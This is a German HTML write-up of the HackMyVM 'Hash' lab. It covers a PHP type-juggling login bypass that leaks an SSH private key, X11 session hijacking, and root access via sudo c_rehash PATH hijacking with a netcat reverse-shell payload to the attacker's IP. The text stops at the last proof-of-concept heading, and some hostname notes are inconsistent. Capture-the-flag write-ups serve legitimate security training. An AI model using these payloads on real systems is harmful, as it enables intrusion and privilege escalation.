@@ -1,0 +1,485 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hash - HackMyVM - Hard - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Hash - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">enum4linux (versucht)</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">wfuzz (versucht)</div>
+                <div class="tool-item">curl (implizit)</div>
+                <div class="tool-item">base64 (implizit)</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">rdesktop</div>
+                <div class="tool-item">xterm</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">ssh-keygen (implizit)</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">c_rehash</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">echo</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & Credential Discovery</a></li>
+                <li><a href="#proof-of-concept-type-juggling">Proof of Concept (PHP Type Juggling)</a></li>
+                <li><a href="#initial-access">Initial Access (SSH as marco)</a></li>
+                <li><a href="#privilege-escalation-marco">Privilege Escalation (marco -> maria via X11 Hijacking)</a></li>
+                <li><a href="#privilege-escalation-maria">Privilege Escalation (maria -> root via Sudo/PATH Hijacking)</a></li>
+                <li><a href="#proof-of-concept-path-hijack">Proof of Concept (c_rehash PATH Hijacking)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.146	08:00:27:60:37:0b	PCS Systemtechnik GmbH</span></pre>
+                     <pre><span class="comment">=</span></pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:** Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerksegment mittels ARP nach aktiven Geräten zu durchsuchen.</p>
+             <p class="evaluation">**Bewertung:** Ein Host mit der IP-Adresse `192.168.2.146` wird identifiziert. Die MAC-Adresse (`08:00:27:...`) weist auf eine VirtualBox VM hin.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ziel-IP `192.168.2.146` notieren und mit Port-Scanning (Nmap) fortfahren.<br>**Empfehlung (Admin):** Standard-Netzwerkaufklärung. Fokus auf Absicherung der Dienste.</p>
+
+             <p class="comment">*(Hinweis: Das Log zeigt später, dass die IP 192.168.2.110 verwendet wird. Es wird angenommen, dass dies die korrekte IP für den Rest des Berichts ist, möglicherweise aufgrund einer DHCP-Änderung oder eines Tippfehlers beim ersten Scan.)*</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.110 -p-</span></div> <span class="comment"><-- Ziel-IP ist .110 --></span>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at [Datum nicht verfügbar]
+Nmap scan report for [Hostname nicht verfügbar] (192.168.2.110)
+Host is up ([...] latency).
+Not shown: [...] closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+<span class="command">22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2</span>
+<span class="command">80/tcp   open  http          nginx 1.14.2</span>
+<span class="command">3389/tcp open  ms-wbt-server xrdp</span> <span class="password"><-- RDP (xrdp)! --></span>
+[...] <span class="comment">(SSH host keys, OS details etc.)</span>
+
+Nmap done: 1 IP address (1 host up) scanned in X.XX seconds</pre>
+                     <pre><span class="comment">=</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein umfassender Nmap-Scan (`-sS`, `-sC`, `-T5`, `-A`, `-p-`) wird auf `192.168.2.110` durchgeführt.</p>
+             <p class="evaluation">**Bewertung:** Drei offene TCP-Ports werden identifiziert:
+*   **Port 22 (SSH):** OpenSSH 7.9p1 (Debian 10). Standard-Fernzugriff.
+*   **Port 80 (HTTP):** Nginx 1.14.2. Standard-Webserver.
+*   **Port 3389 (RDP):** Ein `xrdp`-Server läuft, der das Microsoft Remote Desktop Protocol auf Linux bereitstellt. Dies ist ein wichtiger Angriffsvektor, wenn gültige Benutzercredentials erlangt werden.</p>
+             <p class="recommendation">**Empfehlung (Pentester):**
+    1.  **HTTP (Priorität 1):** Untersuchen Sie den Webserver auf Port 80 (Gobuster, Nikto, manuelle Analyse).
+    2.  **RDP (Priorität 2):** Halten Sie Port 3389 im Hinterkopf. Sobald Credentials gefunden werden, versuchen Sie einen RDP-Login (z.B. mit `rdesktop` oder `xfreerdp`).
+    3.  **SSH (Priorität 3):** Halten Sie nach Benutzernamen Ausschau.<br>
+**Empfehlung (Admin):** Sichern Sie alle Dienste. Härten Sie die Nginx-Konfiguration. Wenn RDP über `xrdp` nicht benötigt wird, deaktivieren Sie den Dienst. Wenn er benötigt wird, sichern Sie ihn durch starke Passwörter, Netzwerksegmentierung und ggf. Multi-Faktor-Authentifizierung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">enum4linux -a 192.168.2.110</span></div>
+                     <pre><span class="comment">=</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Versuch der SMB-Enumeration mit `enum4linux`.</p>
+             <p class="evaluation">**Bewertung:** Im Log wird keine Ausgabe gezeigt. Da Nmap keine SMB-Ports (139, 445) gefunden hat, ist dieser Scan erwartungsgemäß erfolglos und liefert keine Informationen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** SMB ignorieren, auf HTTP und RDP konzentrieren.<br>**Empfehlung (Admin):** Keine Aktion erforderlich (da SMB nicht läuft).</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration & Credential Discovery</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.110 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,[...]</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+[...]
+===============================================================
+[+] Url:                     http://192.168.2.110
+[...]
+===============================================================
+<span class="command">/index.html</span>           (Status: 200) [Size: 453]
+<span class="command">/check.php</span>            (Status: 200) [Size: 19]
+<span class="command">/check.bak</span>            (Status: 200) [Size: 273] <span class="password"><-- Backup-Datei! --></span>
+[...]</pre>
+                     <pre><span class="comment">=</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Gobuster wird verwendet, um Verzeichnisse und Dateien auf dem Nginx-Server (Port 80) zu finden.</p>
+             <p class="evaluation">**Bewertung:** Findet `index.html`, `check.php` und **kritisch:** `check.bak`. Backup-Dateien enthalten oft Quellcode oder sensible Informationen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Laden Sie `check.bak` sofort herunter und analysieren Sie den Quellcode von `check.php`.<br>**Empfehlung (Admin):** **Niemals Backup-Dateien im Web-Root oder öffentlich zugänglichen Verzeichnissen belassen!** Konfigurieren Sie den Webserver so, dass der Zugriff auf `.bak`-Dateien blockiert wird.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.110/check.bak</span></div>
+                     <pre>
+[...]
+2022-09-07 09:41:30 (66,9 MB/s) - »check.bak« gespeichert [273/273]</pre>
+                     <pre><span class="comment">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Die Datei `check.bak` wird erfolgreich heruntergeladen.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt die Existenz und Zugänglichkeit der Backup-Datei.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat check.bak</span></div>
+                     <pre>
+<?php
+// Login part.
+$pass = $_POST['password'];
+//marco please dont use md5, is not secure. <span class="comment"><-- Hinweis auf Benutzer 'marco' --></span>
+//$passwordhashed = hash('md5', $pass);
+$passwordhashed = hash('sha256',$pass); <span class="comment">// Verwendet SHA256</span>
+if ($passwordhashed == '0e0001337') { <span class="password"><-- Kritische Bedingung: Type Juggling! --></span>
+//Your code here
+}
+else{
+//Another code here
+}
+//To finish
+?></pre>
+                     <pre><span class="comment">-----------------------------------------------</span></pre>
+                       <pre><span class="comment">Sha256(0e0001337) = 3985a9d08ed6e6ff46759951eae2b7ce8916418a6a2092a52402a2ff58f94723</span></pre> <span class="comment"><-- Irrelevante Info? --></span>
+                      <pre><span class="comment">
+http://192.168.2.110/
+Marco, remember to delete the .bak file</span></pre>
+                      <pre><span class="comment">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span></pre>
+                 </div>
+            </div>
+              <p class="analysis">**Analyse:** Der Quellcode von `check.php` (aus `check.bak`) wird analysiert:
+1.  Nimmt ein Passwort via POST entgegen.
+2.  Enthält einen Kommentar, der den Benutzernamen `marco` erwähnt.
+3.  Berechnet den SHA256-Hash des eingegebenen Passworts.
+4.  **Kritische Schwachstelle:** Vergleicht den SHA256-Hash **locker** (`==`) mit dem String `'0e0001337'`. Dies ist eine **PHP Type Juggling** Schwachstelle. PHP interpretiert Strings, die mit `0e` beginnen und nur aus Ziffern bestehen, bei einem losen Vergleich (`==`) als wissenschaftliche Notation mit dem Wert 0. Wenn also der SHA256-Hash des eingegebenen Passworts ebenfalls mit `0e` beginnt und nur Ziffern danach enthält, wird er als 0 interpretiert, und `0 == 0` ist wahr.</p>
+              <p class="evaluation">**Bewertung:** Eine klare Type-Juggling-Schwachstelle im Login-Mechanismus von `check.php`. Der Benutzer `marco` wird als relevanter Benutzer identifiziert. Das Ziel ist, ein Passwort zu finden, dessen SHA256-Hash mit `0e` beginnt und nur Ziffern enthält ("Magic Hash").</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Suchen Sie nach bekannten Passwörtern, deren SHA256-Hash die "Magic Hash"-Bedingung erfüllt. Eine bekannte Liste (wie die im nächsten Schritt heruntergeladene `sha256.md`) enthält solche Passwörter. Das Passwort `34250003024812` ist ein bekanntes Beispiel. Senden Sie einen POST-Request an `check.php` mit `password=34250003024812`, um die Bedingung zu erfüllen und den Code im `if`-Block auszuführen.<br>**Empfehlung (Admin):** **Beheben Sie die Type-Juggling-Schwachstelle!** Verwenden Sie immer strikte Vergleiche (`===`) für Authentifizierungsprüfungen und sensible Vergleiche. Entfernen Sie die `.bak`-Datei.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -u "http://192.168.2.110/check.php?FUZZ=../../../../etc/passwd" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 19 --hc=500</span></div>
+                     <pre><span class="comment">[... Keine Ergebnisse ...]</span></pre>
+                     <pre><span class="comment">#</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Versuch, `check.php` mittels Parameter-Fuzzing auf LFI zu testen.</p>
+             <p class="evaluation">**Bewertung:** Erfolglos, liefert keine Ergebnisse. `check.php` scheint keine LFI-Schwachstelle über GET-Parameter zu haben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget https://raw.githubusercontent.com/spaze/hashes/master/sha256.md</span></div>
+                     <pre>
+[...]
+2022-10-13 09:56:47 (49,3 MB/s) - »sha256.md« gespeichert [1068/1068]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat sha256.md</span></div>
+                     <pre>
+<span class="password">34250003024812:0e46289032038065916139621039085883773413820991920706299695051332</span> <span class="password"><-- Gesuchtes Passwort! --></span>
+TyNOQHUS:0e66298694359207596086558843543959518835691168370379069085300385
+[...]</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Eine Liste bekannter "Magic Hashes" für SHA256 wird von GitHub heruntergeladen.</p>
+             <p class="evaluation">**Bewertung:** Die Liste enthält das Passwort `34250003024812`, dessen SHA256-Hash (`0e46...`) die Bedingung für die Type-Juggling-Schwachstelle erfüllt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie `34250003024812` als Passwort im POST-Request an `check.php`.<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">auf die Seite gehen und den hash als Passwort eingeben und User ist marco,
+dann erhalten wir den ssh key: http://192.168.2.110/check.php
+
+passwort: <span class="password">34250003024812</span>
+user:     <span class="command">marco</span></span></pre>
+                     <pre><span class="comment">                              Ausgabe:</span></pre>
+                     <pre><span class="password">
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAxiKdFmWJiVfVYaNGov1xuh0/nrXnNsx2s6g5IoIJrmkX+9qzt2US
+[...]
+-----END OPENSSH PRIVATE KEY-----</span></pre>
+                 </div>
+            </div>
+              <p class="analysis">**Analyse:** Eine Notiz fasst zusammen: Durch Senden des Passworts `34250003024812` an `check.php` (implizit zusammen mit einem beliebigen Benutzernamen, da dieser nur zur MD5-Berechnung dient, die hier irrelevant ist, oder vielleicht speziell `marco`) wird der `if`-Block im PHP-Code ausgelöst. Dieser Block gibt (wie nun klar wird) den privaten SSH-Schlüssel für den Benutzer `marco` aus.</p>
+              <p class="evaluation">**Bewertung:** Die Type-Juggling-Schwachstelle wurde erfolgreich ausgenutzt, um den privaten SSH-Schlüssel von `marco` zu exfiltrieren.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Speichern Sie den Schlüssel, setzen Sie die korrekten Berechtigungen (`chmod 600`) und verwenden Sie ihn, um sich als `marco` per SSH anzumelden.<br>**Empfehlung (Admin):** Beheben Sie die Type-Juggling-Schwachstelle. Geben Sie niemals private Schlüssel über Webanwendungen aus.</p>
+         </section>
+
+        <section id="proof-of-concept-type-juggling">
+             <h2>Proof of Concept (PHP Type Juggling)</h2>
+             <p class="comment">**Kurzbeschreibung:** Das Skript `/check.php` nimmt ein Passwort per POST entgegen, berechnet dessen SHA256-Hash und vergleicht diesen mittels eines losen Vergleichs (`==`) mit dem String `'0e0001337'`. Aufgrund von PHP's Type Juggling wird `'0e0001337'` als wissenschaftliche Notation mit dem numerischen Wert 0 interpretiert. Ein Angreifer kann ein Passwort suchen (einen "Magic Hash"), dessen SHA256-Hash ebenfalls mit `0e` beginnt und nur Ziffern enthält (z.B. das Passwort `34250003024812`). Wenn dieses Passwort gesendet wird, wird dessen SHA256-Hash (`0e46...`) von PHP ebenfalls als 0 interpretiert. Der Vergleich `$passwordhashed == '0e0001337'` wird somit zu `0 == 0`, was wahr ist. Dies umgeht die beabsichtigte Passwortprüfung und führt dazu, dass der Code innerhalb des `if`-Blocks ausgeführt wird, der in diesem Fall den privaten SSH-Schlüssel des Benutzers `marco` preisgibt.</p>
+             <p class="comment">**Voraussetzungen:** Zugriff auf `/check.php`, Kenntnis der Type-Juggling-Anfälligkeit und eines passenden "Magic Hash"-Passworts.</p>
+             <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+             <ol>
+                 <li>Identifizieren der Type-Juggling-Bedingung im Quellcode von `check.php`.</li>
+                 <li>Finden eines Passworts, dessen SHA256-Hash die "Magic Hash"-Bedingung erfüllt (z.B. `34250003024812` aus bekannten Listen).</li>
+                 <li>Senden eines POST-Requests an `/check.php` mit dem gefundenen Passwort im `password`-Parameter (z.B. mit `curl -d "password=34250003024812" http://[Ziel-IP]/check.php`).</li>
+             </ol>
+             <p class="comment">**Erwartetes Ergebnis:** Die Authentifizierungsprüfung wird umgangen, und der private SSH-Schlüssel von `marco` wird in der HTTP-Antwort zurückgegeben.</p>
+             <p class="comment">**Beweismittel:** Der Quellcode von `check.bak`, das "Magic Hash"-Passwort und die Ausgabe des SSH-Schlüssels.</p>
+             <p class="comment">**Risikobewertung:** Kritisch. Ermöglicht die Umgehung der Authentifizierung und die Kompromittierung des SSH-Schlüssels eines Benutzers, was zum initialen Zugriff führt.</p>
+             <p class="comment">**Empfehlungen:** Verwenden Sie immer strikte Vergleiche (`===`) in PHP, insbesondere bei Sicherheitsprüfungen. Überprüfen Sie Datentypen. Verwenden Sie keine unsicheren Vergleichswerte.</p>
+         </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (SSH as marco)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi benn.txt</span></div> <span class="comment"><-- SSH Key speichern --></span>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">chmod 600 benn.txt</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh -i benn.txt marco@hash.hmv</span></div> <span class="comment"><-- Hostname inkonsistent, sollte 'eighty.hmv' sein --></span>
+                     <pre>
+Linux hash 4.19.0-14-amd64 [...] <span class="comment"><-- Hostname 'hash'? --></span>
+[...]
+Last login: Fri Feb  5 10:35:47 2021 from 192.168.1.58
+<span class="prompt">marco@hash:~$</span> <span class="password"><-- Login erfolgreich! --></span></pre>
+                     <pre><span class="comment">=</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der über die Type-Juggling-Schwachstelle erlangte private SSH-Schlüssel wird lokal in `benn.txt` gespeichert und die Berechtigungen werden angepasst. Anschließend wird SSH verwendet, um sich als `marco` am Zielsystem (`hash.hmv` - der Hostname im Log ist inkonsistent, sollte `eighty.hmv` sein) mit dem Schlüssel anzumelden.</p>
+             <p class="evaluation">**Bewertung:** Der SSH-Login als `marco` ist erfolgreich. Initialer Zugriff wurde erlangt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** User-Flag lesen, Enumeration als `marco` durchführen (`id`, `sudo -l`, etc.).<br>**Empfehlung (Admin):** Type-Juggling-Schwachstelle beheben, SSH-Schlüssel von `marco` austauschen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">marco@hash:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">hashmanready</span></pre> <span class="comment"><-- User Flag --></span>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die User-Flag wird im Home-Verzeichnis von `marco` gefunden und gelesen.</p>
+              <p class="evaluation">**Bewertung:** User-Flag (`hashmanready`) erfolgreich erhalten.</p>
+         </section>
+
+        <section id="privilege-escalation-marco">
+            <h2>Privilege Escalation (marco -> maria via X11 Hijacking)</h2>
+            <p class="analysis">**Analyse:** Als `marco` wird das System enumeriert, was zur Entdeckung einer Möglichkeit führt, die X11-Sitzung eines anderen Benutzers (`maria`) zu übernehmen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">marco@hash:~$ <span class="command">ls -la</span></div>
+                     <pre>
+[...]
+-rw-------  1 marco marco    13 Feb  5  2021 user.txt
+drwxr-xr-x  2 marco marco  4096 Feb  5  2021 Videos
+-rw-r--r--  1 marco marco    15 Feb  5  2021 <span class="command">.x</span> <span class="comment"><-- Interessante Datei --></span>
+-rw-------  1 marco marco   149 Feb  5  2021 <span class="command">.Xauthority</span> <span class="password"><-- X11 Cookie! --></span>
+[...]</pre>
+                     <pre><span class="comment">#</span></pre>
+                     <div class="prompt">marco@hash:~$ <span class="command">cat .x</span></div>
+                     <pre>marcothehasher</pre> <span class="comment"><-- Hinweis/Name --></span>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Im Home-Verzeichnis von `marco` werden die Dateien `.x` und `.Xauthority` gefunden. `.Xauthority` enthält das "Magic Cookie", das für die Authentifizierung bei X11-Sitzungen verwendet wird.</p>
+             <p class="evaluation">**Bewertung:** Der Fund der `.Xauthority`-Datei ist entscheidend für den nächsten Schritt. Wenn diese Datei in das Home-Verzeichnis eines anderen Benutzers kopiert werden kann, der ebenfalls eine aktive X11-Sitzung hat (z.B. über RDP), kann dessen Sitzung übernommen werden.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, die `.Xauthority`-Datei in das Home-Verzeichnis eines anderen Benutzers (z.B. `maria`, falls dieser durch `/etc/passwd` oder andere Mittel bekannt ist) zu kopieren. Stellen Sie eine RDP-Verbindung als `marco` her und versuchen Sie, einen `xterm` zu starten, der sich dann möglicherweise mit der Sitzung des anderen Benutzers verbindet.<br>**Empfehlung (Admin):** Sichern Sie Home-Verzeichnisse und insbesondere `.Xauthority`-Dateien mit korrekten Berechtigungen (`600`). Vermeiden Sie Szenarien, in denen Benutzer Schreibzugriff auf die Home-Verzeichnisse anderer Benutzer haben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">marco@hash:~$ <span class="command">cp .Xauthority /home/maria/.Xauthority</span></div> <span class="comment"><-- Kopieren nach /home/maria --></span>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Marcos `.Xauthority`-Datei wird in das Home-Verzeichnis von `maria` kopiert. *Dies impliziert, dass `marco` Schreibrechte auf `/home/maria` oder `/home/maria/.Xauthority` hat (Fehlkonfiguration!) oder dass dieser Befehl bereits aus einer höheren Rechteebene ausgeführt wird.*</p>
+             <p class="evaluation">**Bewertung:** Die Voraussetzung für das X11-Hijacking ist geschaffen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Stellen Sie eine RDP-Verbindung her und starten Sie `xterm`.<br>**Empfehlung (Admin):** Korrigieren Sie die Berechtigungen für Home-Verzeichnisse.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">rdesktop 192.168.2.110</span></div> <span class="comment"><-- RDP Verbindung als marco --></span>
+                     <pre>
+Autoselecting keyboard map 'de' from locale
+Connection established using plain RDP.
+[...]</pre>
+                     <div class="prompt">marco@hash:~$ <span class="command">id</span></div> <span class="comment"><-- Innerhalb der RDP-Session --></span>
+                     <pre>uid=1000(marco) gid=1000(marco) groups=1000(marco)[...]</pre>
+                     <div class="prompt">marco@hash:~$ <span class="command">xterm</span></div> <span class="comment"><-- Startet xterm --></span>
+                     <pre><span class="comment">nach einer Zeit öffnet sich ganz automatisch ein neuer xterm Terminal im rdesktop als maria!</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Eine RDP-Verbindung wird als `marco` hergestellt. Innerhalb der RDP-Sitzung wird `xterm` gestartet. Aufgrund der zuvor kopierten `.Xauthority`-Datei authentifiziert sich dieser `xterm`-Prozess erfolgreich gegen die laufende X11-Sitzung von `maria` und öffnet ein Terminal mit Marias Rechten.</p>
+             <p class="evaluation">**Bewertung:** Erfolgreiches X11 Session Hijacking! Der Angreifer hat nun eine Shell als Benutzer `maria` erlangt. Eskalation von `marco` zu `maria` abgeschlossen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Arbeiten Sie nun in der `xterm`-Shell als `maria`. Führen Sie Enumeration durch (`id`, `sudo -l`).<br>**Empfehlung (Admin):** Berechtigungen für Home-Verzeichnisse und `.Xauthority` korrigieren. X11-Forwarding und -Zugriff sicher konfigurieren.</p>
+
+             <p class="comment">*(Hinweis: Die folgenden Schritte im Log bezüglich SSH-Schlüsselgenerierung und Upload für Maria sind ein alternativer, aber komplexerer Weg, um eine Shell als Maria zu erhalten, der hier wahrscheinlich nicht nötig war, da das X11-Hijacking bereits funktionierte. Sie werden hier zur Vollständigkeit analysiert, aber der Fokus liegt auf dem Hijacking.)*</p>
+         </section>
+
+        <section id="privilege-escalation-maria">
+            <h2>Privilege Escalation (maria -> root via Sudo/PATH Hijacking)</h2>
+             <p class="analysis">**Analyse:** Als Benutzer `maria` (über die gehijackte `xterm`-Sitzung) wird nach dem finalen Weg zu Root-Rechten gesucht.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">maria@hash:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for maria on hash:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User maria may run the following commands on hash:
+    (<span class="command">ALL : ALL</span>) NOPASSWD: /usr/bin/c_rehash</pre> <span class="password"><-- Kritische Sudo-Regel! --></span>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** `sudo -l` wird als `maria` ausgeführt.</p>
+             <p class="evaluation">**Bewertung:** Eine **kritische Sudo-Regel** wird gefunden: `maria` darf `/usr/bin/c_rehash` als jeder Benutzer (`ALL : ALL`, effektiv `root`) ohne Passwort (`NOPASSWD:`) ausführen. `/usr/bin/c_rehash` ist ein Skript, das Zertifikats-Hashes neu berechnet und dabei intern den `openssl`-Befehl aufruft.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie **PATH Hijacking**:
+    1.  Erstellen Sie in einem schreibbaren Verzeichnis (z.B. `/tmp` oder Marias Home) ein Skript namens `openssl`.
+    2.  Fügen Sie einen Reverse-Shell-Payload in dieses Skript ein (z.B. `#!/bin/bash \nnc -e /bin/bash [Angreifer-IP] [Port]`).
+    3.  Machen Sie das Skript ausführbar (`chmod +x openssl`).
+    4.  Führen Sie den Sudo-Befehl aus, wobei Sie sicherstellen, dass das Verzeichnis mit dem bösartigen Skript im `$PATH` vor `/usr/bin` steht: `sudo PATH=.:$PATH /usr/bin/c_rehash` (wenn sich das bösartige Skript im aktuellen Verzeichnis befindet).<br>
+**Empfehlung (Admin):** **Entfernen Sie diese Sudo-Regel!** Oder stellen Sie sicher, dass `/usr/bin/c_rehash` interne Befehle mit vollem Pfad aufruft und der `secure_path` in `sudoers` korrekt konfiguriert ist.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>listening on [any] 4444 ...</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Netcat-Listener wird auf Port 4444 gestartet.</p>
+             <p class="evaluation">**Bewertung:** Bereit für die Root-Shell.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">maria@hash:~$ <span class="command">echo "nc -e /bin/bash 192.168.2.140 4444" > openssl</span></div> <span class="comment"><-- Payload erstellen --></span>
+                     <div class="prompt">maria@hash:~$ <span class="command">chmod +x openssl</span></div>
+                     <div class="prompt">maria@hash:~$ <span class="command">sudo PATH=.:$PATH /usr/bin/c_rehash</span></div> <span class="comment"><-- Exploit ausführen --></span>
+                     <pre>Doing /usr/lib/ssl/certs</pre> <span class="comment"><-- Normale Ausgabe, aber Payload wird ausgeführt --></span>
+                      <pre><span class="comment">=</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der PATH-Hijacking-Exploit wird durchgeführt:
+1.  Ein Skript namens `openssl` wird im aktuellen Verzeichnis (Marias Home) erstellt, das den Reverse-Shell-Payload enthält.
+2.  Es wird ausführbar gemacht.
+3.  Der `c_rehash`-Befehl wird mit `sudo` ausgeführt, wobei der `PATH` manipuliert wird (`PATH=.:$PATH`), sodass das aktuelle Verzeichnis (`.`) zuerst durchsucht wird.</p>
+             <p class="evaluation">**Bewertung:** `c_rehash` (als Root) versucht `openssl` auszuführen, findet und startet wegen des manipulierten PATHs das bösartige Skript im aktuellen Verzeichnis. Der Reverse-Shell-Payload wird mit Root-Rechten ausgeführt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Überprüfen Sie den Listener.<br>**Empfehlung (Admin):** Sudo-Regel entfernen/härten.</p>
+         </section>
+
+         <section id="proof-of-concept-path-hijack">
+             <h2>Proof of Concept (c_rehash PATH Hijacking)</h2>
